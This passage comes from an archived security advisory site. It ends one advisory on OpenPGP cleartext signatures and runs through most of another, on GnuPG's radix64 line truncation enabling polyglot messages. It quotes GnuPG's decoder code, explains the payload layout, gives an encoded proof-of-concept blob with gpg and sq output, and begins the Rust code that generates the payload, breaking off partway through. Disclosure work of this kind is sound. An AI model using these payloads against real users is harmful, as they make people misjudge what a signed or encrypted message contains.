FreeBSD-14.2-RELEASE-amd64-universal.iso</code> file is inserted.</p> <!---=
-><pre class=3D"shiki github-dark-default" style=3D"background-color:#0d111=
7;color:#e6edf3" tabindex=3D"0"><code><span class=3D"line"><span>-----BEGIN=
 PGP SIGNED MESSAGE-----</span></span>
<span class=3D"line"><span>Hash: SHA512</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>SHA256 (FreeBSD-14.2-RELEASE-amd64-universal.iso=
) =3D 2f1f6cf637397e205a1f7ff5058747256424e3a9c2e30fea129ece5c324ebd7b</spa=
n></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>SHA256 (FreeBSD-14.2-RELEASE-amd64-bootonly.iso)=
 =3D d063e48b81b99005c8097e60377c23fb07e4116c5f0c0b41a5dc368fc4df6bf9</span=
></span>
<span class=3D"line"><span>SHA256 (FreeBSD-14.2-RELEASE-amd64-bootonly.iso.=
xz) =3D f3668cd0f3dd503f58047ac098b3dd6d1962bb4e8f8ff3fb6abb632ef2d5f8f9</s=
pan></span>
<span class=3D"line"><span>SHA256 (FreeBSD-14.2-RELEASE-amd64-disc1.iso) =
=3D a3c771e2fa958e922a5771047d524d7df3ce501e58bed5c65f0226e4d31ebd30</span>=
</span>
<span class=3D"line"><span>SHA256 (FreeBSD-14.2-RELEASE-amd64-disc1.iso.xz)=
 =3D e64212a911ecb204083198aca3b64b6d50d5295c8de4d98b66553292024bac7c</span=
></span>
<span class=3D"line"><span>SHA256 (FreeBSD-14.2-RELEASE-amd64-dvd1.iso) =3D=
 b158612828166e5fb7b34a76718387b0ed40ef425cfdb88a067aa349713dcae4</span></s=
pan>
<span class=3D"line"><span>SHA256 (FreeBSD-14.2-RELEASE-amd64-dvd1.iso.xz) =
=3D d1c874fd5ba8e9f0c26737d8b1c2304c14ea6c6ff5b71a572b731f9c21223f8a</span>=
</span>
<span class=3D"line"><span>SHA256 (FreeBSD-14.2-RELEASE-amd64-memstick.img)=
 =3D 90121a72477a3d74cf4d2d3715836b7624f4a8cdaa08b8131faa88e21b15b32b</span=
></span>
<span class=3D"line"><span>SHA256 (FreeBSD-14.2-RELEASE-amd64-memstick.img.=
xz) =3D b1636d6d72932df2eb757cc0b1ea1e7d532c895c960518c74063cbadce020de2</s=
pan></span>
<span class=3D"line"><span>SHA256 (FreeBSD-14.2-RELEASE-amd64-mini-memstick=
.img) =3D ecb3477acbe8b8b6150a4248a5facddf2d3aac1e9cb507e6bec3a9c0b51f7769<=
/span></span>
<span class=3D"line"><span>SHA256 (FreeBSD-14.2-RELEASE-amd64-mini-memstick=
.img.xz) =3D 40ee8c07704945e3bfa52e8dd9d354eb60a3240ab86a606191c280dabdff5e=
b6</span></span>
<span class=3D"line"><span>-----BEGIN PGP SIGNATURE-----</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>iQIzBAEBCgAdFiEEglY7hNBiDtwN+4ZBOJfy4i5lrT8FAmdK=
Dr4ACgkQOJfy4i5l</span></span>
<span class=3D"line"><span>rT8IAA//fWQQvtYyWzFV2mVjsCi8pi1gu/Wl4fd4KxXVpVLW=
ky5tCJcOkBsF97IU</span></span>
<span class=3D"line"><span>eaZpq1P86bUwXz20nekypzO8RHSR37KKOXRIS5pP5PUiuGR0=
B3Fh6FOj0LygckTl</span></span>
<span class=3D"line"><span>mC1+VnWQu2XhQ6W7kN3nEyx2YznDe9TyeKpjlVnVCRG4FEI2=
r2jHJpgY69itwN9B</span></span>
<span class=3D"line"><span>47Ec2ude0JimCawHxTyMCfbXsPtvcE4mPLMc/2Z3VdgHFKpp=
//S0rDbkJ6080Oln</span></span>
<span class=3D"line"><span>FOq0BWHNSsQPLAWo63UwpmfgYykzjOd+2j1skbW8yiy+Ia+f=
7heJaremUR9GdeJL</span></span>
<span class=3D"line"><span>bQddM+BAB64bw8wp5ooTctPWhgwmaSmVyEh8KKY9EIFo6Tmz=
yWgq2YmixbiAhN4g</span></span>
<span class=3D"line"><span>uAOx7+t4rmzh/TnxAwavTXSJp6/vhYD4EfoOHLPOy2zME5Yo=
MNa8Kj/Y9UOVPhoz</span></span>
<span class=3D"line"><span>OjN10QSv1/P7zrLDA6Qp4IZ7FAGs+E3tTiEvXs7To7bHPhnx=
xfuK1I7r20pK27a7</span></span>
<span class=3D"line"><span>gBK/qlVys8VWzBYvdjUAIx/JWD4u5SQ5C+VNSuyYqH5WFuOm=
mKAYpRRntfovNLUF</span></span>
<span class=3D"line"><span>Tb7dYSJup+Q/fMTg/6hEKxN7/udKIYD/WoV9ik896cwFgtYr=
kdkGdKJybCE1M9GF</span></span>
<span class=3D"line"><span>HKkEa3VeMKJkVzY5lOHA9nqkQOUCdCx3EaW6orEvc+R1p6xE=
6Fg=3D</span></span>
<span class=3D"line"><span>=3Dq66Y</span></span>
<span class=3D"line"><span>-----END PGP SIGNATURE-----</span></span>
<span class=3D"line"><span></span></span></code></pre><!----> <p>Generally,=
 the inserted text follows the hash header + a null byte, can=E2=80=99t con=
tain a newline, and is terminated by a newline.
This constraint may catch the malicious injection when parsing a file with =
a 3rd party downstream tool, such as some implementations of the sha512sum =
utility.
The vulnerability is applicable to exploitation scenarios beyond hash diges=
t verification.</p> <h2>Recommendation</h2> <p>Removal of the Cleartext Sig=
nature Framework from the <em>OpenPGP</em> standard helps resolve the <a hr=
ef=3D"https://www.rfc-editor.org/rfc/rfc9580.html#name-issues-with-the-clea=
rtext-s" rel=3D"nofollow">issues with the Cleartext Signature Framework</a>=
. Furthermore, deprecation allows for a graceful phase-out.</p> <p><em>Open=
PGP</em> users should avoid using cleartext signatures, as is also recommen=
ded by <em>GnuPG</em>.</p> <p><em>GnuPG</em> should implement the signature=
 validation constraints from the RFC to mitigate the <a href=3D"https://www=
.rfc-editor.org/rfc/rfc9580.html#name-issues-with-the-cleartext-s" rel=3D"n=
ofollow">issues with the Cleartext Signature Framework</a>.</p> <p>To preve=
nt confusion about the actual signed data, <em>OpenPGP</em> implementations=
 should output the data bound by the signature during validation by default=
. <em>sequoia-sq</em> does so. <em>GnuPG</em> does not and requires the <co=
de>--output</code> option to be set.</p> <p>When working with <em>OpenPGP</=
em> signatures in general, users should instruct their PGP implementation t=
o output the signed data and only use this output for any further or relate=
d tasks.</p><!----></article><!----><!----></main> <footer class=3D"bg-blue=
-500 p-4">contact: <a href=3D"/cdn-cgi/l/email-protection" class=3D"__cf_em=
ail__" data-cfemail=3D"c8aba7a6bca9abbc88afb8afe6aea9a1a4">[email&#160;prot=
ected]</a></footer><!----><!--]--> <!--[!--><!--]--><!--]--><script data-cf=
async=3D"false" src=3D"/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-de=
code.min.js"></script></body>
</html>

--1yeeQ81UyVL57Vl7
Content-Type: text/html; charset=utf-8
Content-Disposition: attachment; filename="11-polyglot.html"
Content-Transfer-Encoding: quoted-printable

<!doctype html>
<html lang=3D"en">
	<head>
		<meta charset=3D"utf-8" />
		<meta name=3D"darkreader-lock" />
		<meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D=
1" />
		<link rel=3D"manifest" href=3D"/manifest.webmanifest">
        <link rel=3D"icon" href=3D"/favicon.ico" sizes=3D"32x32">
        <link rel=3D"icon" href=3D"/icon.svg" type=3D"image/svg+xml">
        <link rel=3D"apple-touch-icon" href=3D"/apple-touch-icon.png">
=09=09
		<link href=3D"./_app/immutable/assets/0.B3PCwX-h.css" rel=3D"stylesheet">=
<!--12qhfyh--><!----><title>gpg.fail</title>
	</head>
	<body><!--[--><!--[--><!----><main class=3D"min-w-full max-w-[1280px] my-a=
uto bg-green-500 p-4 space-y-4"><!----><article class=3D"prose mx-auto"><h1=
>Radix64 Line-Truncation Enabling Polyglot Attacks</h1> <!----><p><em>GnuPG=
</em> drops data, causing the same <em>OpenPGP</em> message to be interpret=
ed differently by <em>GnuPG</em> and parsers adhering to the specification.=
</p> <h2>Impact</h2> <p>An attacker can craft ASCII-armored <em>OpenPGP</em=
> data that contains an over-long radix64 line. It will be interpreted diff=
erently by <em>GnuPG</em> than by spec-conforming parsers. This enables <st=
rong>format-confusion / polyglot</strong> attacks where a section of a long=
 line is dropped by <em>GnuPG</em> but processed by other implementations, =
so the effective plaintext and packet sequence differ across implementation=
s. Downstream effects include:</p> <ul><li>Appending attacker-chosen bytes =
to earlier packets when viewed by <em>GnuPG</em>, while a correct implement=
ation treats them as a separate packet.</li> <li>Producing different decryp=
ted outputs across implementations for the same armored blob.</li></ul> <p>=
<em>OpenPGP</em>=E2=80=99s armor rules require decoders to <strong>ignore a=
ll whitespace in radix64</strong> (and armor line lengths are a presentatio=
n constraint, not a semantic one). The observed behavior violates that expe=
ctation.</p> <h2>Details</h2> <p><em>OpenPGP</em>=E2=80=99s ASCII armor (=
=E2=80=9Cradix-64=E2=80=9D) is a base64 transport encoding format. The RFC =
<a href=3D"https://www.rfc-editor.org/rfc/rfc9580.html#section-6-4" rel=3D"=
nofollow">describes</a> formation of armor and its base64 decoding</p> <blo=
ckquote><p>When decoding base64, an OpenPGP implementation MUST ignore all =
whitespace.</p></blockquote> <p>Since implementations are required to disca=
rd whitespace, the meaning of the data should not be affected by line lengt=
h or location of newline characters.</p> <p>Additionally, the RFC imposes a=
 <a href=3D"https://www.rfc-editor.org/rfc/rfc9580.html#name-base64-convers=
ions" rel=3D"nofollow">maximum line length</a> for the base64 encoded data =
in the armor body of 76 characters per line.</p> <p><em>GnuPG</em>=E2=80=99=
s armor decoder, <code>radix64_read</code> reads the radix64 stream <strong=
>line by line</strong> using a fixed <code>MAX_LINELEN</code> and a buffere=
d <code>iobuf_read_line</code>. If a line exceeds this limit, the code <str=
ong>truncates</strong> the line (sets <code>afx->truncated++</code>) and co=
ntinues with the <strong>next</strong> line, effectively discarding the tai=
l of the over-long line instead of continuing to collect any remaining base=
64 encoded data.</p> <!----><pre class=3D"shiki github-dark-default" style=
=3D"background-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span clas=
s=3D"line"><span style=3D"color:#FF7B72">static</span><span style=3D"color:=
#FF7B72"> int</span><span style=3D"color:#D2A8FF"> radix64_read</span><span=
 style=3D"color:#E6EDF3">(</span><span style=3D"color:#79C0FF">armor_filter=
_context_t</span><span style=3D"color:#FF7B72">*</span><span style=3D"color=
:#FFA657"> afx</span><span style=3D"color:#E6EDF3">, IOBUF </span><span sty=
le=3D"color:#FFA657">a</span><span style=3D"color:#E6EDF3">, </span><span s=
tyle=3D"color:#FF7B72">size_t*</span><span style=3D"color:#FFA657"> retn</s=
pan><span style=3D"color:#E6EDF3">,</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                        =
byte</span><span style=3D"color:#FF7B72">*</span><span style=3D"color:#FFA6=
57"> buf</span><span style=3D"color:#E6EDF3">, </span><span style=3D"color:=
#FF7B72">size_t</span><span style=3D"color:#FFA657"> size</span><span style=
=3D"color:#E6EDF3">) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">	byte val;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">	int</span><span style=
=3D"color:#E6EDF3"> c;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">	u32 binc;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">	int</span><span style=
=3D"color:#E6EDF3"> checkcrc </span><span style=3D"color:#FF7B72">=3D</span=
><span style=3D"color:#79C0FF"> 0</span><span style=3D"color:#E6EDF3">;</sp=
an></span>
<span class=3D"line"><span style=3D"color:#FF7B72">	int</span><span style=
=3D"color:#E6EDF3"> rc </span><span style=3D"color:#FF7B72">=3D</span><span=
 style=3D"color:#79C0FF"> 0</span><span style=3D"color:#E6EDF3">;</span></s=
pan>
<span class=3D"line"><span style=3D"color:#FF7B72">	size_t</span><span styl=
e=3D"color:#E6EDF3"> n </span><span style=3D"color:#FF7B72">=3D</span><span=
 style=3D"color:#79C0FF"> 0</span><span style=3D"color:#E6EDF3">;</span></s=
pan>
<span class=3D"line"><span style=3D"color:#FF7B72">	int</span><span style=
=3D"color:#E6EDF3"> idx, onlypad </span><span style=3D"color:#FF7B72">=3D</=
span><span style=3D"color:#79C0FF"> 0</span><span style=3D"color:#E6EDF3">;=
</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">	int</span><span style=
=3D"color:#E6EDF3"> skip_fast </span><span style=3D"color:#FF7B72">=3D</spa=
n><span style=3D"color:#79C0FF"> 0</span><span style=3D"color:#E6EDF3">;</s=
pan></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">	idx </span><span style=
=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> afx->idx;</span=
></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">	val </span><span style=
=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> afx->radbuf[</s=
pan><span style=3D"color:#79C0FF">0</span><span style=3D"color:#E6EDF3">];<=
/span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">	for</span><span style=
=3D"color:#E6EDF3"> (n </span><span style=3D"color:#FF7B72">=3D</span><span=
 style=3D"color:#79C0FF"> 0</span><span style=3D"color:#E6EDF3">; n </span>=
<span style=3D"color:#FF7B72">&#x3C;</span><span style=3D"color:#E6EDF3"> s=
ize;) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">		if</span><span style=
=3D"color:#E6EDF3"> (afx->buffer_pos </span><span style=3D"color:#FF7B72">&=
#x3C;</span><span style=3D"color:#E6EDF3"> afx->buffer_len) c </span><span =
style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> afx->buffe=
r[afx->buffer_pos</span><span style=3D"color:#FF7B72">++</span><span style=
=3D"color:#E6EDF3">];</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">		else</span><span style=
=3D"color:#E6EDF3"> &#123;</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">			/* read the next line=
 */</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">			unsigned</span><span =
style=3D"color:#E6EDF3"> maxlen </span><span style=3D"color:#FF7B72">=3D</s=
pan><span style=3D"color:#E6EDF3"> MAX_LINELEN;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">			afx->buffer_pos </spa=
n><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF"> 0<=
/span><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">			afx->buffer_len </spa=
n><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> io=
buf_read_line</span><span style=3D"color:#E6EDF3">(a, </span><span style=3D=
"color:#FF7B72">&#x26;</span><span style=3D"color:#E6EDF3">afx->buffer,</sp=
an></span>
<span class=3D"line"><span style=3D"color:#FF7B72">			                     =
             &#x26;</span><span style=3D"color:#E6EDF3">afx->buffer_size, <=
/span><span style=3D"color:#FF7B72">&#x26;</span><span style=3D"color:#E6ED=
F3">maxlen);</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">			if</span><span style=
=3D"color:#E6EDF3"> (</span><span style=3D"color:#FF7B72">!</span><span sty=
le=3D"color:#E6EDF3">maxlen) afx->truncated</span><span style=3D"color:#FF7=
B72">++</span><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">			if</span><span style=
=3D"color:#E6EDF3"> (</span><span style=3D"color:#FF7B72">!</span><span sty=
le=3D"color:#E6EDF3">afx->buffer_len) </span><span style=3D"color:#FF7B72">=
break</span><span style=3D"color:#E6EDF3">;</span><span style=3D"color:#8B9=
49E"> /* eof */</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">			continue</span><span =
style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">		&#125;</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">    // ...</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  &#125;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;</span></span></co=
de></pre><!----> <p>As a result, an attacker can craft an armor body of the=
 following structure:</p> <!----><pre class=3D"shiki github-dark-default" s=
tyle=3D"background-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span =
class=3D"line"><span>[1. first 19998 characters][2. overlong tail of same l=
ine]</span></span>
<span class=3D"line"><span>[3. next line]</span></span></code></pre><!---->=
 <ul><li>Correct implementations (whitespace-agnostic) decode <strong>1 + 2=
 + 3</strong>, or choose not to accept the overlong line exeeding the 76 ch=
aracter limit.</li> <li><em>GnuPG</em> decodes <strong>1 + 3</strong>, drop=
ping <strong>2</strong>. Instead of failing explicitly with an error messag=
e, only a warning is printed.</li></ul> <p>This makes it possible to craft =
a blob that decrypts/parses as <strong>two different packet layouts</strong=
> depending on the implementation. A practical construction:</p> <ul><li>=
=E2=80=9C2=E2=80=9D and =E2=80=9C3=E2=80=9D have the same length.</li> <li>=
=E2=80=9C3=E2=80=9D is a valid packet on its own.</li> <li>=E2=80=9C1=E2=80=
=9D includes a packet whose declared length covers <strong>(1 + 2)</strong>=
.</li> <li>The base64 for =E2=80=9C1=E2=80=9D is <strong>exactly 19998 char=
acters</strong>, so truncation happens between =E2=80=9C1=E2=80=9D and =E2=
=80=9C2=E2=80=9D.</li></ul> <p>Then:</p> <ul><li><em>GnuPG</em> appends =E2=
=80=9C3=E2=80=9D behind =E2=80=9C1=E2=80=9C=E2=80=98s packet body (since it=
 dropped =E2=80=9C2=E2=80=9D).</li> <li>A correct implementation appends =
=E2=80=9C2=E2=80=9D behind =E2=80=9C1=E2=80=9D as intended and parses =E2=
=80=9C3=E2=80=9D as a separate packet.</li></ul> <h3>Detailed steps to repr=
oduce</h3> <p>A minimal payload triggers the split behavior:</p> <p><em>Gnu=
PG</em> drops the tail of the over-long line and complains about the armor,=
 but still emits partial data (=E2=80=9Cmeow=E2=80=A6=E2=80=9D) before bail=
ing; Sequoia (<code>sq</code>) processes the entire base64 stream as specif=
ied in the RFC and outputs both fragments.</p> <!----><pre class=3D"shiki g=
ithub-dark-default" style=3D"background-color:#0d1117;color:#e6edf3" tabind=
ex=3D"0"><code><span class=3D"line"><span style=3D"color:#FFA657">$</span><=
span style=3D"color:#A5D6FF"> echo</span><span style=3D"color:#A5D6FF"> "H4=
sIAAAAAAACA+3cOwrCQAAE0H5P4QWCrY3FapZoYYgEFdsQUFALQWJyez+Ngr3Ve80Mc4jJsqdZK=
pblqCqq0SrVdSzSa8xCGMZhEmN+Pe0P8a3Zbbv2HgEAAAAAAAAAAAAAAAAAAAAAAAD4s/nleG6K=
vlsuyn5++Oxh6CavzDepXX/3MI39rQvvf7lU5j+fcw9xRmuwj04AAA=3D=3D"</span><span s=
tyle=3D"color:#FF7B72"> </span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  |</span><span style=3D=
"color:#FFA657"> base64</span><span style=3D"color:#79C0FF"> -d</span><span=
 style=3D"color:#FF7B72"> </span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  |</span><span style=3D=
"color:#FFA657"> gunzip</span><span style=3D"color:#FF7B72"> ></span><span =
style=3D"color:#A5D6FF"> polyglot</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FFA657">$</span><span style=3D"c=
olor:#A5D6FF"> sq</span><span style=3D"color:#A5D6FF"> decrypt</span><span =
style=3D"color:#A5D6FF"> polyglot</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">meow</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">hello</span><span style=
=3D"color:#A5D6FF"> sq</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">0=C2=A0authenticated</sp=
an><span style=3D"color:#A5D6FF"> signatures.</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FFA657">$</span><span style=3D"c=
olor:#A5D6FF"> gpg</span><span style=3D"color:#79C0FF"> --decrypt</span><sp=
an style=3D"color:#A5D6FF"> polyglot</span><span style=3D"color:#E6EDF3"> <=
/span></span>
<span class=3D"line"><span style=3D"color:#FFA657">meow=EF=BF=BD=EF=BF=BDPG=
P=EF=BF=BD=EF=BF=BDPGPgpg:</span><span style=3D"color:#A5D6FF"> invalid</sp=
an><span style=3D"color:#A5D6FF"> armor:</span><span style=3D"color:#A5D6FF=
"> line</span><span style=3D"color:#A5D6FF"> longer</span><span style=3D"co=
lor:#A5D6FF"> than</span><span style=3D"color:#79C0FF"> 20000</span><span s=
tyle=3D"color:#A5D6FF"> characters</span></span></code></pre><!----> <p>The=
 payload was generated with:</p> <!----><pre class=3D"shiki github-dark-def=
ault" style=3D"background-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code=
><span class=3D"line"><span style=3D"color:#8B949E">//! &#96;&#96;&#96;carg=
o</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">//! [dependencies]</span=
></span>
<span class=3D"line"><span style=3D"color:#8B949E">//! sequoia-openpgp =3D =
"2.0.0"</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">//! simple-base64 =3D "0=
.23.2"</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">//! &#96;&#96;&#96;</spa=
n></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">use</span><span style=3D=
"color:#FFA657"> sequoia_openpgp</span><span style=3D"color:#FF7B72">::</sp=
an><span style=3D"color:#FFA657">serialize</span><span style=3D"color:#FF7B=
72">::</span><span style=3D"color:#FFA657">stream</span><span style=3D"colo=
r:#FF7B72">::</span><span style=3D"color:#E6EDF3">&#123;</span><span style=
=3D"color:#FFA657">Armorer</span><span style=3D"color:#E6EDF3">, </span><sp=
an style=3D"color:#FFA657">Message</span><span style=3D"color:#E6EDF3">&#12=
5;;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">use</span><span style=3D=
"color:#FFA657"> sequoia_openpgp</span><span style=3D"color:#FF7B72">::</sp=
an><span style=3D"color:#FFA657">serialize</span><span style=3D"color:#FF7B=
72">::</span><span style=3D"color:#E6EDF3">&#123;</span><span style=3D"colo=
r:#FFA657">MarshalInto</span><span style=3D"color:#E6EDF3">, </span><span s=
tyle=3D"color:#FFA657">Serialize</span><span style=3D"color:#E6EDF3">&#125;=
;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">use</span><span style=3D=
"color:#FFA657"> sequoia_openpgp</span><span style=3D"color:#FF7B72">::</sp=
an><span style=3D"color:#FFA657">types</span><span style=3D"color:#FF7B72">=
::</span><span style=3D"color:#FFA657">DataFormat</span><span style=3D"colo=
r:#FF7B72">::</span><span style=3D"color:#FFA657">Binary</span><span style=
=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">use</span><span style=3D=
"color:#FFA657"> sequoia_openpgp</span><span style=3D"color:#FF7B72">::</sp=
an><span style=3D"color:#FFA657">Packet</span><span style=3D"color:#E6EDF3"=
>;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">use</span><span style=3D=
"color:#FFA657"> sequoia_openpgp</span><span style=3D"color:#FF7B72">::</sp=
an><span style=3D"color:#FFA657">packet</span><span style=3D"color:#FF7B72"=
>::</span><span style=3D"color:#FFA657">header</span><span style=3D"color:#=
FF7B72">::</span><span style=3D"color:#FFA657">CTBNew</span><span style=3D"=
color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">use</span><span style=3D=
"color:#FFA657"> sequoia_openpgp</span><span style=3D"color:#FF7B72">::</sp=
an><span style=3D"color:#FFA657">packet</span><span style=3D"color:#FF7B72"=
>::</span><span style=3D"color:#E6EDF3">&#123;</span><span style=3D"color:#=
FFA657">Literal</span><span style=3D"color:#E6EDF3">, </span><span style=3D=
"color:#FFA657">Tag</span><span style=3D"color:#E6EDF3">&#125;;</span></spa=
n>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">fn</span><span style=3D"=
color:#D2A8FF"> main</span><span style=3D"color:#E6EDF3">() &#123;</span></=
span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#FF7B72"> mut</span><span style=3D"color:#E6EDF3"> nop_sled </sp=
an><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#FFA657"> C=
TBNew</span><span style=3D"color:#FF7B72">::</span><span style=3D"color:#D2=
A8FF">new</span><span style=3D"color:#E6EDF3">(</span><span style=3D"color:=
#FFA657">Tag</span><span style=3D"color:#FF7B72">::</span><span style=3D"co=
lor:#FFA657">Marker</span><span style=3D"color:#E6EDF3">)</span><span style=
=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">to_vec</span><span=
 style=3D"color:#E6EDF3">()</span><span style=3D"color:#FF7B72">.</span><sp=
an style=3D"color:#D2A8FF">unwrap</span><span style=3D"color:#E6EDF3">();</=
span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    nop_sled</span><span=
 style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">append</span=
><span style=3D"color:#E6EDF3">(</span><span style=3D"color:#FF7B72">&#x26;=
mut</span><span style=3D"color:#E6EDF3"> [</span><span style=3D"color:#79C0=
FF">255</span><span style=3D"color:#E6EDF3">, </span><span style=3D"color:#=
79C0FF">0</span><span style=3D"color:#E6EDF3">, </span><span style=3D"color=
:#79C0FF">0</span><span style=3D"color:#E6EDF3">, </span><span style=3D"col=
or:#79C0FF">0</span><span style=3D"color:#E6EDF3">, </span><span style=3D"c=
olor:#79C0FF">3</span><span style=3D"color:#E6EDF3">]</span><span style=3D"=
color:#FF7B72">.</span><span style=3D"color:#D2A8FF">to_vec</span><span sty=
le=3D"color:#E6EDF3">());</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    nop_sled</span><span=
 style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">append</span=
><span style=3D"color:#E6EDF3">(</span><span style=3D"color:#FF7B72">&#x26;=
mut</span><span style=3D"color:#A5D6FF"> b"PGP"</span><span style=3D"color:=
#FF7B72">.</span><span style=3D"color:#D2A8FF">to_vec</span><span style=3D"=
color:#E6EDF3">());</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">    assert_eq!</span><sp=
an style=3D"color:#E6EDF3">(nop_sled</span><span style=3D"color:#FF7B72">.<=
/span><span style=3D"color:#D2A8FF">len</span><span style=3D"color:#E6EDF3"=
>() </span><span style=3D"color:#FF7B72">%</span><span style=3D"color:#79C0=
FF"> 3</span><span style=3D"color:#E6EDF3">, </span><span style=3D"color:#7=
9C0FF">0</span><span style=3D"color:#E6EDF3">);</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> inner_size </span><span style=3D"color:#FF7B72">=3D</s=
pan><span style=3D"color:#79C0FF"> 20000</span><span style=3D"color:#8B949E=
"> // GPG line length</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        /</span><span st=
yle=3D"color:#79C0FF"> 4</span><span style=3D"color:#FF7B72"> *</span><span=
 style=3D"color:#79C0FF"> 3</span><span style=3D"color:#8B949E"> // base64 =
conversion</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        -</span><span st=
yle=3D"color:#79C0FF"> 12</span><span style=3D"color:#E6EDF3">; </span><spa=
n style=3D"color:#8B949E">// length of header</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#FF7B72"> mut</span><span style=3D"color:#E6EDF3"> text </span><=
span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#A5D6FF"> b"meo=
w"</span><span style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF=
">to_vec</span><span style=3D"color:#E6EDF3">();</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    text</span><span sty=
le=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">pad_to</span><sp=
an style=3D"color:#E6EDF3">(inner_size, </span><span style=3D"color:#79C0FF=
">0</span><span style=3D"color:#E6EDF3">);</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#FF7B72"> mut</span><span style=3D"color:#E6EDF3"> after </span>=
<span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#A5D6FF"> b"</=
span><span style=3D"color:#FF7B72">&#92;n</span><span style=3D"color:#A5D6F=
F">hello sq</span><span style=3D"color:#FF7B72">&#92;n</span><span style=3D=
"color:#A5D6FF">"</span><span style=3D"color:#FF7B72">.</span><span style=
=3D"color:#D2A8FF">to_vec</span><span style=3D"color:#E6EDF3">();</span></s=
pan>
<span class=3D"line"><span style=3D"color:#E6EDF3">    after</span><span st=
yle=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">pad_to</span><s=
pan style=3D"color:#E6EDF3">(nop_sled</span><span style=3D"color:#FF7B72">.=
</span><span style=3D"color:#D2A8FF">len</span><span style=3D"color:#E6EDF3=
">(), </span><span style=3D"color:#79C0FF">0</span><span style=3D"color:#E6=
EDF3">);</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#FF7B72"> mut</span><span style=3D"color:#E6EDF3"> after_sleds <=
/span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"=
> vec!</span><span style=3D"color:#E6EDF3">[];</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    while</span><span st=
yle=3D"color:#E6EDF3"> after_sleds</span><span style=3D"color:#FF7B72">.</s=
pan><span style=3D"color:#D2A8FF">len</span><span style=3D"color:#E6EDF3">(=
) &#x3C; after</span><span style=3D"color:#FF7B72">.</span><span style=3D"c=
olor:#D2A8FF">len</span><span style=3D"color:#E6EDF3">() &#123;</span></spa=
n>
